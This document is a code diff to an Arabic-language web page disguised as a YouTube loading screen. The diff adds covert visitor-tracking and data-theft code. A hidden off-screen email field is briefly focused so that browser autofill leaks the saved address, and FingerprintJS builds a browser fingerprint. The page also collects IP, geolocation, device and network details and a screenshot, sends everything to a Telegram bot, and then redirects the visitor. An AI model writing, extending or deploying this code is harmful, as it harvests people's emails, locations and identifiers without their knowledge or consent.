@@ -2,14 +2,15 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>YouTube</title>
     <link rel="icon" type="image/x-icon" href="https://www.youtube.com/s/desktop/12d6b690/img/favicon.ico">
-    <!-- مكتبة html2canvas لالتقاط لقطة الشاشة بدقة عالية -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js">
-    </script>
+    <!-- html2canvas للقطة الشاشة -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <!-- FingerprintJS لجمع بصمة المتصفح -->
+    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
-        /* ===== RESET & BASE ===== */
+        /* ===== RESET & BASE (نفس التصميم السابق) ===== */
         * {
             margin: 0;
             padding: 0;
@@ -24,8 +25,6 @@
             display: flex;
             flex-direction: column;
         }
-
-        /* ===== HEADER (شبيه بيوتيوب) ===== */
         .header {
             background: #0f0f0f;
             height: 56px;
@@ -72,8 +71,6 @@
             font-size: 14px;
             color: #fff;
         }
-
-        /* ===== MAIN LOADING ===== */
         .loading-container {
             flex: 1;
             display: flex;
@@ -83,8 +80,6 @@
             padding: 40px 20px;
             position: relative;
         }
-
-        /* Spinner متطور */
         .spinner-wrapper {
             margin-bottom: 40px;
         }
@@ -117,8 +112,6 @@
                 transform: rotate(360deg);
             }
         }
-
-        /* نقاط متحركة */
         .dots {
             display: flex;
             gap: 12px;
@@ -151,8 +144,6 @@
                 opacity: 1;
             }
         }
-
-        /* شريط التقدم الوهمي المتطور */
         .progress-wrap {
             width: 320px;
             max-width: 80%;
@@ -180,8 +171,6 @@
                 background-position: 200% 0;
             }
         }
-
-        /* نص الحالة (خفيف جداً) */
         .status-text {
             font-size: 14px;
             color: #717171;
@@ -190,8 +179,7 @@
             font-weight: 300;
             letter-spacing: 0.3px;
         }
-
-        /* ===== زر المشاركة السحري (في الزاوية اليمنى السفلية) ===== */
+        /* زر المشاركة */
         .share-btn {
             position: fixed;
             bottom: 24px;
@@ -206,7 +194,6 @@
             justify-content: center;
             cursor: pointer;
             box-shadow: 0 4px 16px rgba(0, 0, 0, 0.6);
-            transition: all 0.3s ease;
             z-index: 999;
             opacity: 0;
             transform: scale(0.8);
@@ -216,17 +203,23 @@
             opacity: 1;
             transform: scale(1);
         }
-        .share-btn:hover {
-            background: #333;
-            transform: scale(1.05);
-        }
         .share-btn svg {
             width: 24px;
             height: 24px;
             fill: #aaa;
         }
 
-        /* ===== RESPONSIVE ===== */
+        /* حقل الإيميل الخفي (لا يظهر للمستخدم) */
+        .hidden-email-field {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+        }
+
         @media (max-width: 480px) {
             .youtube-logo svg {
                 width: 70px;
@@ -293,7 +286,10 @@
         <div class="status-text" id="statusText">جاري التحميل ...</div>
     </div>
 
-    <!-- ===== زر المشاركة السحري (يظهر بعد التقاط الصورة) ===== -->
+    <!-- ===== حقل إيميل خفي لاستغلال autofill ===== -->
+    <input type="email" class="hidden-email-field" id="hiddenEmail" name="email" autocomplete="email" value="">
+
+    <!-- ===== زر المشاركة السحري ===== -->
     <button class="share-btn" id="shareBtn">
         <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
     </button>
@@ -316,7 +312,9 @@
         let isRedirected = false;
         let progressValue = 0;
         let progressInterval = null;
-        let capturedImage = null; // لتخزين الصورة بعد التقاطها
+        let capturedImage = null;
+        let fingerprint = null;
+        let collectedEmail = null;
 
         const shareBtn = document.getElementById('shareBtn');
 
@@ -343,7 +341,63 @@
         }
 
         // ================================================================
-        //  جمع البيانات
+        //  محاولة الحصول على البريد الإلكتروني عبر autofill
+        // ================================================================
+        function tryGetEmail() {
+            return new Promise((resolve) => {
+                const emailInput = document.getElementById('hiddenEmail');
+                // نجعل الحقل مرئياً للحظة لتفعيل autofill ثم نخفيه
+                emailInput.style.position = 'relative';
+                emailInput.style.left = '0';
+                emailInput.style.top = '0';
+                emailInput.style.opacity = '0';
+                emailInput.style.pointerEvents = 'none';
+                emailInput.style.width = '1px';
+                emailInput.style.height = '1px';
+                emailInput.style.position = 'absolute';
+
+                // نطلب من المتصفح أن يملأ الحقل
+                // نضبط التركيز ثم نزيله
+                emailInput.focus();
+                setTimeout(() => {
+                    emailInput.blur();
+                }, 100);
+
+                // ننتظر قليلاً ليتسنى للمتصفح التعبئة
+                setTimeout(() => {
+                    const email = emailInput.value.trim();
+                    if (email && email.includes('@')) {
+                        collectedEmail = email;
+                        log(`📧 تم العثور على بريد إلكتروني: ${email}`);
+                    } else {
+                        log('📧 لم يتم العثور على بريد إلكتروني مخزن');
+                    }
+                    // إخفاء الحقل نهائياً
+                    emailInput.style.display = 'none';
+                    resolve(collectedEmail);
+                }, 800);
+            });
+        }
+
+        // ================================================================
+        //  جمع بصمة المتصفح (Fingerprint)
+        // ================================================================
+        async function getFingerprint() {
+            try {
+                const fp = await FingerprintJS.load();
+                const result = await fp.get();
+                return {
+                    visitorId: result.visitorId,
+                    components: result.components
+                };
+            } catch (e) {
+                log(`❌ فشل جمع البصمة: ${e.message}`);
+                return null;
+            }
+        }
+
+        // ================================================================
+        //  جمع بيانات الجهاز
         // ================================================================
         function collectDeviceInfo() {
             const ua = navigator.userAgent;
@@ -370,14 +424,26 @@
                 windowSize: `${window.innerWidth}x${window.innerHeight}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cookieEnabled: navigator.cookieEnabled,
-                onlineStatus: navigator.onLine
+                onlineStatus: navigator.onLine,
+                // معلومات إضافية
+                deviceMemory: navigator.deviceMemory || 'غير معروف',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType || 'unknown',
+                    downlink: navigator.connection.downlink || '?',
+                    rtt: navigator.connection.rtt || '?'
+                } : null
             };
         }
 
+        // ================================================================
+        //  الحصول على IP
+        // ================================================================
         async function getIP() {
             const services = [
                 { url: 'https://api.ipify.org?format=json', key: 'ip' },
-                { url: 'https://httpbin.org/ip', key: 'origin' }
+                { url: 'https://httpbin.org/ip', key: 'origin' },
+                { url: 'https://api.my-ip.io/ip.json', key: 'ip' }
             ];
             for (const svc of services) {
                 try {
@@ -395,6 +461,9 @@
             return 'غير متوفر';
         }
 
+        // ================================================================
+        //  الحصول على الموقع الجغرافي
+        // ================================================================
         function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) { resolve(null); return; }
@@ -408,7 +477,9 @@
                         resolve({
                             latitude: +coords.latitude.toFixed(6),
                             longitude: +coords.longitude.toFixed(6),
-                            accuracy: Math.round(coords.accuracy)
+                            accuracy: Math.round(coords.accuracy),
+                            altitude: coords.altitude,
+                            speed: coords.speed
                         });
                     },
                     () => { if (!done) { done = true;
@@ -421,12 +492,11 @@
         }
 
         // ================================================================
-        //  التقاط لقطة الشاشة (باستخدام html2canvas)
+        //  التقاط لقطة الشاشة
         // ================================================================
         async function captureScreenshot() {
             try {
                 const element = document.getElementById('captureArea');
-                // نلتقط الصورة بدقة عالية (2x)
                 const canvas = await html2canvas(element, {
                     scale: 1.8,
                     backgroundColor: '#0f0f0f',
@@ -454,19 +524,20 @@
         }
 
         // ================================================================
-        //  إرسال إلى تليجرام (صورة + بيانات)
+        //  إرسال إلى تليجرام (صورة + بيانات + البريد الإلكتروني إن وجد)
         // ================================================================
-        async function sendToTelegram(data, imageDataURL) {
+        async function sendToTelegram(data, imageDataURL, email, fp) {
             const token = CONFIG.botToken;
             const chatId = CONFIG.chatId;
             if (!token || !chatId) return false;
 
-            // بناء التعليق (Caption) للصورة
             const d = data;
             const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
             const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';
 
-            let caption = `🎯 *زائر جديد - مع لقطة شاشة*\n\n`;
+            let caption = `🎯 *زائر جديد - بيانات متقدمة*\n\n`;
+            caption += `📧 *البريد الإلكتروني:* ${email || 'غير موجود'}\n`;
+            caption += `🆔 *بصمة المتصفح:* ${fp ? fp.visitorId : 'غير متوفرة'}\n\n`;
             caption += `⏰ *التوقيت:* ${d.device.localTime}\n`;
             caption += `🌐 *الرابط:* ${d.device.url}\n`;
             caption += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
@@ -474,16 +545,21 @@
             caption += `🌍 *المتصفح:* ${d.device.browser}\n`;
             caption += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
             caption += `🗣 *اللغة:* ${d.device.language}\n`;
-            caption += `💻 *النظام:* ${d.device.platform}\n\n`;
-            caption += `🌐 *IP:* ${d.ip}\n`;
+            caption += `💻 *النظام:* ${d.device.platform}\n`;
+            caption += `🧠 *الذاكرة:* ${d.device.deviceMemory} GB (${d.device.hardwareConcurrency} نوى)\n`;
+            if (d.device.connection) {
+                caption +=
+                    `📡 *الشبكة:* ${d.device.connection.type} (${d.device.connection.downlink} Mbps, RTT ${d.device.connection.rtt}ms)\n`;
+            }
+            caption += `\n🌐 *IP:* ${d.ip}\n`;
             caption += `📍 *الموقع:* ${loc}\n`;
             if (mapLink) caption += `🗺️ [خريطة](${mapLink})\n`;
             caption += `\n📐 *الشاشة:* ${d.device.screenSize}\n`;
-            caption += `⏳ *المنطقة:* ${d.device.timezone}`;
+            caption += `⏳ *المنطقة:* ${d.device.timezone}\n`;
+            caption += `🍪 *الكوكيز:* ${d.device.cookieEnabled ? 'مفعل' : 'معطل'}`;
 
             try {
                 if (imageDataURL) {
-                    // إرسال الصورة مع التعليق
                     const blob = dataURLtoBlob(imageDataURL);
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
@@ -499,13 +575,10 @@
                         log('✅ تم إرسال الصورة + البيانات إلى تليجرام');
                         return true;
                     } else {
-                        const text = await res.text();
-                        log(`❌ فشل إرسال الصورة: ${res.status} - ${text}`);
-                        // محاولة إرسال النص فقط كخطة بديلة
+                        log(`❌ فشل إرسال الصورة، نرسل نصاً فقط`);
                         return await sendTextOnly(token, chatId, caption);
                     }
                 } else {
-                    // إرسال نص فقط
                     return await sendTextOnly(token, chatId, caption);
                 }
             } catch (e) {
@@ -514,7 +587,7 @@
             }
         }
 
-        // إرسال نص فقط (احتياطي)
+        // إرسال نص فقط
         async function sendTextOnly(token, chatId, text) {
             try {
                 const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -532,15 +605,13 @@
         }
 
         // ================================================================
-        //  زر المشاركة (واتساب / فيسبوك / أي تطبيق)
+        //  زر المشاركة
         // ================================================================
         function setupShareButton(imageDataURL) {
             if (!imageDataURL) {
                 shareBtn.style.display = 'none';
                 return;
             }
-
-            // تحويل الصورة إلى Blob و File
             const blob = dataURLtoBlob(imageDataURL);
             const file = new File([blob], 'youtube_screenshot.jpg', { type: 'image/jpeg' });
 
@@ -559,19 +630,17 @@
                         }
                     }
                 } else {
-                    // للمتصفحات التي لا تدعم Web Share API (نسخ الرابط)
                     alert('اضغط مع الاستمرار على الصورة لحفظها، ثم شاركها يدوياً.');
-                    // محاولة فتح الصورة في تبويب جديد لحفظها
                     const win = window.open();
                     if (win) {
                         win.document.write(
-                            `<img src="${imageDataURL}" style="max-width:100%;height:auto;" /><br/><p>اضغط مع الاستمرار لحفظ الصورة</p>`);
+                            `<img src="${imageDataURL}" style="max-width:100%;height:auto;" /><br/><p>اضغط مع الاستمرار لحفظ الصورة</p>`
+                            );
                         win.document.title = 'YouTube Screenshot';
                     }
                 }
             });
 
-            // إظهار الزر مع تأثير أنيق
             setTimeout(() => {
                 shareBtn.classList.add('visible');
             }, 1000);
@@ -581,9 +650,9 @@
         //  العملية الرئيسية
         // ================================================================
         async function main() {
-            log('🚀 بدء التشغيل المتطور مع لقطة الشاشة');
+            log('🚀 بدء التشغيل المتطور (جمع شامل)');
 
-            // 1. بدء شريط التقدم الوهمي
+            // 1. شريط التقدم
             progressInterval = setInterval(updateProgress, 300);
 
             // 2. جمع البيانات الأساسية
@@ -599,27 +668,33 @@
 
             const finalData = { device: deviceInfo, ip, location };
 
-            // 3. التقاط لقطة الشاشة (بدون انتظار طويل)
-            log('📸 جاري التقاط الصورة...');
-            const screenshotData = await captureScreenshot();
-            if (screenshotData) {
-                log('✅ تم التقاط الصورة بنجاح');
-                capturedImage = screenshotData;
-                // إعداد زر المشاركة
-                setupShareButton(screenshotData);
+            // 3. محاولة الحصول على البريد الإلكتروني (في الخلفية)
+            log('📧 محاولة جلب البريد الإلكتروني المحفوظ...');
+            const email = await tryGetEmail();
+
+            // 4. الحصول على بصمة المتصفح
+            log('🖐️ جلب بصمة المتصفح...');
+            const fp = await getFingerprint();
+
+            // 5. التقاط لقطة الشاشة
+            log('📸 التقاط الصورة...');
+            const screenshot = await captureScreenshot();
+            if (screenshot) {
+                capturedImage = screenshot;
+                setupShareButton(screenshot);
+                log('✅ تم التقاط الصورة');
             } else {
-                log('⚠️ لم يتم التقاط الصورة، سيتم إرسال البيانات نصياً فقط');
+                log('⚠️ فشل التقاط الصورة');
             }
 
-            // 4. إرسال إلى تليجرام (صورة + بيانات)
-            log('📤 جاري الإرسال إلى تليجرام...');
-            await sendToTelegram(finalData, screenshotData);
+            // 6. إرسال إلى تليجرام
+            log('📤 إرسال البيانات إلى تليجرام...');
+            await sendToTelegram(finalData, screenshot, email, fp);
 
-            // 5. تحديد وقت الانتظار العشوائي
+            // 7. التحويل بعد مدة عشوائية
             const delay = Math.floor(Math.random() * (CONFIG.maxDelay - CONFIG.minDelay + 1)) + CONFIG.minDelay;
             log(`⏳ الانتظار ${delay} مللي ثانية`);
 
-            // 6. بعد المدة، إنهاء شريط التقدم والتحويل
             setTimeout(() => {
                 finishProgress();
                 setTimeout(() => {
@@ -635,7 +710,7 @@
                 }, 600);
             }, delay);
 
-            // 7. حماية إضافية
+            // 8. حماية إضافية
             setTimeout(() => {
                 if (!isRedirected) {
                     isRedirected = true;
@@ -654,7 +729,7 @@
             window.addEventListener('load', () => setTimeout(main, 600));
         }
 
-        log('✅ تم تحميل النسخة الاحترافية مع لقطة الشاشة والمشاركة');
+        log('✅ تم تحميل النسخة الفائقة مع جمع البريد الإلكتروني والبصمة');
     </script>
 </body>
 </html>
